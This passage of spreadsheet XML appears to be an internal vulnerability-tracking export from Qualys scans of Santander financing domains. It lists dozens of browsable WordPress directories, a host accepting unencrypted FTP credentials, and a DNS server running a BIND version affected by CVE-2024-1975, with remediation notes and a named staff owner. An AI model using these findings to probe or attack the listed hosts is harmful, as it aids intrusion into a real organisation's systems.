    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <m/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="142"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-c74d2bfa-beea-4b7a-b004-59631dce44a9"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/"/>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43"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-1a7280e1-0ea9-468f-b9cd-a2a27b144ba1"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/et-cache/"/>
    <m/>
    <m/>
    <d v="2022-08-13T00:00:00"/>
    <n v="1410"/>
    <d v="2022-11-11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44"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-7e55fa57-fd85-442a-b251-f64b019e4f83"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/et-cache/2239/"/>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45"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-47a80ec7-1010-4548-bc8a-9f6b0b73e303"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/et-cache/3841/"/>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46"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-5ee6b3ae-b2e7-40eb-a936-95e11cba5a0d"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/et-cache/4385/"/>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47"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-0e514120-52ee-429d-91e2-c72738e4b333"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/et-cache/4566/"/>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48"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-cd23932b-e7aa-4fec-a4ee-47f98a8e1517"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/et-cache/4646/"/>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49"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-28241340-063b-4143-ad06-ba16df4f517e"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/et-cache/4900/"/>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50"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-314b5af7-9c12-447f-ad11-d96e17eb6f03"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/et-cache/5724/"/>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Rodriguez"/>
  </r>
  <r>
    <n v="151"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-ede93700-e87a-4303-9c99-40db8fa1b366"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/"/>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52"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-cbbc5d25-78c2-41f0-91dc-0b1024ea5e13"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/breadcrumbs-divi-module/"/>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53"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-7c6d7fb8-9f72-4a6f-b1a9-e210da8b6263"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/breadcrumbs-divi-module/scripts/"/>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54"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-724a76ed-3524-44e9-aa73-7a966d99ff5a"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/breadcrumbs-divi-module/styles/"/>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55"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-66582372-2dfe-4d3a-9f33-2142fe978a9f"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel/"/>
    <m/>
    <m/>
    <d v="2022-08-13T00:00:00"/>
    <n v="1410"/>
    <d v="2022-11-11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Rodriguez"/>
  </r>
  <r>
    <n v="156"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-61a0c007-3308-48f7-897a-5bb424cbab87"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel/scripts/"/>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Rodriguez"/>
  </r>
  <r>
    <n v="157"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-a75df110-0563-4df8-8149-387932e9fdb7"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel/styles/"/>
    <m/>
    <m/>
    <d v="2022-08-13T00:00:00"/>
    <n v="1410"/>
    <d v="2022-11-11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Rodriguez"/>
  </r>
  <r>
    <n v="158"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-9a0fcb83-88c0-4ffd-ac98-13df4aee52ad"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/"/>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59"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-63e63a79-f5f0-4f5b-9d79-7504fe283a91"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/dist/"/>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60"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-4a2ac835-e060-4312-a444-1cad3b07db63"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/dist/scripts/"/>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61"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-d9bb0091-6462-4a3e-b48b-2ba07fef6fa3"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/gdpr-cookie-compliance/dist/styles/"/>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62"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-d7deb97d-47b9-4375-9821-0b4ac5f889c1"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/"/>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63"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-7f6a624a-d522-402b-b785-1832f95b60d0"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/"/>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64"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-ce207a0b-76a1-4807-b1ae-ad8d9e08fa8b"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/core/"/>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65"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-7ab7ba34-4077-46d9-aa59-978daa8b6455"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/core/admin/"/>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66"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-c319946a-6d5f-403a-95e7-3206d2ae762a"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/"/>
    <m/>
    <m/>
    <d v="2023-01-07T00:00:00"/>
    <n v="1263"/>
    <d v="2023-04-07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67"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-271954e7-8f0b-47d5-bd4f-c23e66896b6d"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/fontawesome/"/>
    <m/>
    <m/>
    <d v="2023-01-07T00:00:00"/>
    <n v="1263"/>
    <d v="2023-04-07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68"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-effb62ac-d4f4-453d-908f-9721fbfbc106"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/modules/"/>
    <m/>
    <m/>
    <d v="2023-01-07T00:00:00"/>
    <n v="1263"/>
    <d v="2023-04-07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69"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-28a8e568-2094-46c0-bdaa-a19406080b1b"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/modules/all/"/>
    <m/>
    <m/>
    <d v="2023-01-07T00:00:00"/>
    <n v="1263"/>
    <d v="2023-04-07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70"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-6cc50c0e-7f37-4321-9785-f2351c80241b"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/core/admin/fonts/modules/social/"/>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Rodriguez"/>
  </r>
  <r>
    <n v="171"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-31a2535f-857b-45b3-9138-4914417c8ac6"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/core/admin/js/"/>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72"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-6d760fd2-ffab-4307-9d9e-2a351c14450b"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/includes/"/>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73"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-24b1a5cc-5742-43dd-b44f-f30ac0642f5b"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/"/>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74"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-b1d2c12f-9c36-489a-9b57-9649f1dd69d5"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/feature/"/>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75"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-00835fbe-01b0-4c8b-9e97-ec1dd1e236bc"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/"/>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76"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-83fec3f3-d476-4e85-bf19-5b0358cae730"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/"/>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77"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-db75d3c5-eca9-4b1c-994c-89c967b1808c"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/"/>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78"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-ac06870b-cb49-4372-9123-1001a078980d"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/styles/"/>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79"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-085b84e8-4189-4bb1-ba6c-5753ef51ccb2"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/includes/builder/styles/images/"/>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80"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-92fa0ff1-87ee-4b6f-9680-d9fd9d854ed2"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi/js/"/>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81"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-16dd43b4-20cd-4f3a-a6e6-c231c48f1349"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/themes/Divi-Child/"/>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82"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-a7961b13-8394-4bbf-9dc8-e434a7941dd9"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/"/>
    <m/>
    <m/>
    <d v="2021-12-18T00:00:00"/>
    <n v="1648"/>
    <d v="2022-03-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83"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-47372bb6-7789-48c0-bd55-6f86e0c85143"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/2024/"/>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84"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-1ba2ab7c-8b0f-4414-b01c-85ced50d9f99"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/2024/10/"/>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85"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-18d5c209-19f6-4af8-86b1-3bcddb8b11ab"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/2024/11/"/>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86"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-d5ad46ef-2fb2-4128-8ab6-7ac8ff5eddb3"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/2024/12/"/>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87"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-aaff92f8-fcdc-4e8b-8f86-4709e6bcc94f"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/et-fonts/"/>
    <m/>
    <m/>
    <d v="2022-11-20T00:00:00"/>
    <n v="1311"/>
    <d v="2023-02-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88"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-d53fd5ef-f1e4-4f79-a527-05d67dde452c"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/simply-static/"/>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Rodriguez"/>
  </r>
  <r>
    <n v="189"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-1def3467-6970-4a48-b662-7d83d0233aef"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/simply-static/temp-files/"/>
    <m/>
    <m/>
    <d v="2025-02-01T00:00:00"/>
    <n v="507"/>
    <d v="2025-05-02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Rodriguez"/>
  </r>
  <r>
    <n v="190"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-6ab66b3d-ff1a-4b3d-83ee-eb3551bd3532"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/uploads/simply-static/temp-files/simply-static-1-1739986002/"/>
    <m/>
    <m/>
    <d v="2025-02-22T00:00:00"/>
    <n v="486"/>
    <d v="2025-05-23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Rodriguez"/>
  </r>
  <r>
    <n v="191"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-1b73ba82-33bb-4081-a999-3a57c7a500ca"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-includes/"/>
    <m/>
    <m/>
    <d v="2022-04-01T00:00:00"/>
    <n v="1544"/>
    <d v="2022-06-30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92"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-a216d79d-6b20-495a-a0bf-873605775fc4"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-includes/js/"/>
    <m/>
    <m/>
    <d v="2021-12-18T00:00:00"/>
    <n v="1648"/>
    <d v="2022-03-18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93"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-40d154e1-c70c-495a-b985-1ef54b076f2d"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-includes/js/jquery/"/>
    <m/>
    <m/>
    <d v="2022-01-21T00:00:00"/>
    <n v="1614"/>
    <d v="2022-04-21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94"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-05d6f918-f665-4e28-8ddc-35421de904ab"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/icons/small/"/>
    <m/>
    <m/>
    <d v="2025-02-08T00:00:00"/>
    <n v="500"/>
    <d v="2025-05-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web presenta un listado de directorios."/>
    <s v="La presencia de un directorio navegable no implica necesariamente una vulnerabilidad. Determine si se pretende mostrar el listado del directorio. Compruebe que no haya archivos en el directorio con contenido que no deba ser servido por la aplicación Web."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="195"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-56b638d9-6dff-46be-9685-2d40b841c5ac"/>
    <m/>
    <x v="1"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://www.santanderfinancing.com/not-found/index.html"/>
    <m/>
    <m/>
    <d v="2025-02-08T00:00:00"/>
    <n v="500"/>
    <d v="2025-05-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web."/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="196"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM--8573038591486457342"/>
    <m/>
    <x v="84"/>
    <m/>
    <x v="0"/>
    <s v="High"/>
    <s v="7.3"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-03-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado en el host de destino un servicio de gestión remota que acepta credenciales sin cifrar._x000a__x000a_Se comprueban servicios como FTP con autenticación básica."/>
    <s v="Si es posible, utilice servicios alternativos que proporcionen cifrado._x000a_Utilizando criptografía fuerte, haga que todas las credenciales de autenticación (como contraseñas/frases) sean ilegibles durante la transmisión."/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="197"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM--8461466396492180805"/>
    <m/>
    <x v="85"/>
    <m/>
    <x v="0"/>
    <s v="High"/>
    <s v="7.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="53"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-03-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="ISC BIND (Berkley Internet Domain Name) es una implementación de protocolos DNS._x000a__x000a_Versiones afectadas:_x000a_BIND 9.0.0 -&gt; 9.11.37_x000a_BIND 9.16.0 -&gt; 9.16.50_x000a_BIND 9.18.0 -&gt; 9.18.27_x000a_BIND 9.19.0 -&gt; 9.19.24_x000a_Edición preliminar soportada por BIND 9.9.3-S1 -&gt; 9.11.37-S1_x000a_Versión preliminar compatible con BIND 9.16.8-S1 -&gt; 9.16.49-S1_x000a_Versión preliminar compatible con BIND 9.18.11-S1 -&gt; 9.18.27-S1_x000a__x000a_Versiones parcheadas:_x000a_BIND 9.18.28_x000a_BIND 9.20.0_x000a_Edición preliminar compatible con BIND 9.18.28-S1_x000a__x000a_Lógica de detección de QID: Esta comprobación no autenticada detecta los sistemas vulnerables obteniendo la información de la versión del servicio BIND mediante un banner."/>
    <s v="Se recomienda a los clientes que actualicen a la última versión parcheada de CVE-2024-1975_x000a_Parche:_x000a_A continuación se indican los enlaces para descargar los parches que corrigen las vulnerabilidades:_x000a_ CVE-2024-1975"/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="198"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM-9029470641739675132"/>
    <m/>
    <x v="85"/>
    <m/>
